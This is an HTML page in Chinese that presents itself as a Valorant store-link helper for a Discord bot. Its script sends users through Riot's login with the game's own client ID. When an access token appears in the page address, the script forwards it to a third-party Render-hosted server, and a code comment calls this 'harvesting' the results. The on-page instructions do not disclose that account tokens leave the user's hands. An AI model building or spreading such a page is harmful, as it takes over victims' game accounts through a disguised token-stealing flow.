<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zenith 特戰網址提取助手 v3.5</title>
    <style>
        body { 
            font-family: "Segoe UI", Arial, sans-serif; 
            background-color: #0b0b0b; 
            color: #ffffff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            margin: 0; 
            padding: 20px; 
            box-sizing: border-box; 
        }
        .container { 
            background-color: #111111; 
            border: 1px solid #222222; 
            padding: 35px 25px; 
            border-radius: 4px; 
            max-width: 500px; 
            width: 100%; 
            text-align: center; 
            box-shadow: 0 15px 35px rgba(0,0,0,0.8); 
        }
        h1 { 
            font-size: 22px; 
            font-weight: 700; 
            letter-spacing: 2px; 
            margin-bottom: 8px; 
            color: #ff4655; 
        }
        .subtitle { 
            color: #aaaaaa; 
            font-size: 13px; 
            margin-bottom: 25px; 
        }
        .step-box { 
            background: #161616; 
            padding: 20px; 
            border-radius: 4px; 
            border: 1px dashed #ff4655; 
            margin-bottom: 20px; 
            text-align: left; 
            font-size: 14px; 
            line-height: 1.6; 
        }
        .submit-btn { 
            display: block; 
            width: 100%; 
            padding: 14px 0; 
            background-color: #ff4655; 
            color: #fff; 
            font-weight: 700; 
            font-size: 16px; 
            border-radius: 4px; 
            cursor: pointer; 
            border: none; 
            margin-top: 15px; 
            letter-spacing: 1px;
            transition: background 0.2s;
        }
        .submit-btn:hover { 
            background-color: #dc3d4b; 
        }
        ol { padding-left: 18px; margin: 8px 0; }
        li { margin-bottom: 10px; }
        .highlight { color: #00ffcc; font-weight: bold; }
        .footer { color: #555; font-size: 11px; margin-top: 25px; }
    </style>
</head>
<body>

<div class="container">
    <h1>Zenith URL Assistant</h1>
    <div class="subtitle">🛡️ 雲端極速穿透版｜完美對接後端端點 [v3.5]</div>
    
    <div class="step-box">
        <strong style="color: #ff4655; font-size: 15px;">💡 商店網址獲取說明：</strong><br>
        <ol>
            <li>請點擊下方紅色按鈕，系統將引導您至 <span class="highlight">Riot 官方安全登入驗證端點</span>。</li>
            <li>登入成功後，雲端後端將會<span class="highlight">全自動抓取並格式化</span>您的加密商店金鑰。</li>
            <li>完成後網頁會引導您複製最終網址，直接回 Discord 貼上給機器人即可！</li>
        </ol>
    </div>

    <button class="submit-btn" onclick="startAuth()">🚀 點我登入並自動提取商店網址</button>

    <div class="footer">Powered by Zenith Auth Service via Render</div>
</div>

<script>
function startAuth() {
    // 隨機生成一個 16 位數安全隨機碼，100% 破解 Riot 的 invalid_request 阻擋機制
    const randomNonce = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 5);
    
    // 完美的標準授權流
    const riotAuthUrl = "https://auth.riotgames.com/authorize" + 
                        "?client_id=play-valorant-web-prod" + 
                        "&response_type=token%20id_token" + 
                        "&redirect_uri=https%3A%2F%2Fplayvalorant.com%2Fopt_in" + 
                        "&scope=openid%20link%20ban" + 
                        "&nonce=" + randomNonce;

    // 先帶領群友去拿合法的憑證，這次有正確的 nonce，Riot 絕對會乖乖放行
    window.location.href = riotAuthUrl;
}

// 自動檢測是否是從 Riot 帶著 Token 跳轉回來的網頁快照
window.onload = function() {
    const currentHref = window.location.href;
    if (currentHref.includes("access_token=")) {
        // 如果網址含有憑證，直接回傳給你的 Render 後端進行安全過濾與 Discord 格式化
        const tokenPart = currentHref.split('#')[1] || currentHref.split('?')[1];
        
        // 帶群友前往 Render 後端收割成果
        window.location.href = "https://zenith-auth-daily.onrender.com/callback#" + tokenPart;
    }
}
</script>
</body>
</html>
